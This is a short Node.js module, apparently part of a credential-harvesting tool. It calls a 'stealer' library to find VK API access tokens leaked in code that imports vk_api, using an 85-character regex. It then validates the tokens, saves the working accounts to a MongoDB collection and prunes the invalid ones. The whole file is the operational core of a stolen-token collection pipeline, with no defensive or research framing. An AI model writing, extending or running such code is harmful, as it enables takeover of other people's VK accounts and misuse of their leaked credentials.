const ObjectId = require('mongodb').ObjectID;
const { get_tokens } = require("../../lib/stealer.js");
const { get_accounts, is_token_valid } = require("./checker.js");

const db_update = async (collection) => {
    let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
    let new_accounts = await get_accounts(new_tokens);
    let add_accounts = [];

    await Promise.all(new_accounts.map(async (account) => {
        if (
            (await collection.find( {token: account.token} ).toArray()).length === 0
            && account.type !== "invalid"
        ) {
            add_accounts.push(account);
        };
    }));

    if (add_accounts.length !== 0) {
        await collection.insertMany(add_accounts);
    };
};

const db_clear = async (collection) => {
    let accounts = await collection.find().toArray();
    let del_ids = [];

    await Promise.all(accounts.map(async (account) => {
        if (!await is_token_valid(account.token)) {
            del_ids.push(ObjectId(account._id));
        };
    }));

    if (del_ids.length !== 0) {
        await collection.deleteMany( { "_id": { $in: del_ids } } );
    };
};

const db_administration = async (collection) => {
    db_update(collection).then(console.log("update db"));
    db_clear(collection).then(console.log("clear db"));
}

module.exports = { db_administration };
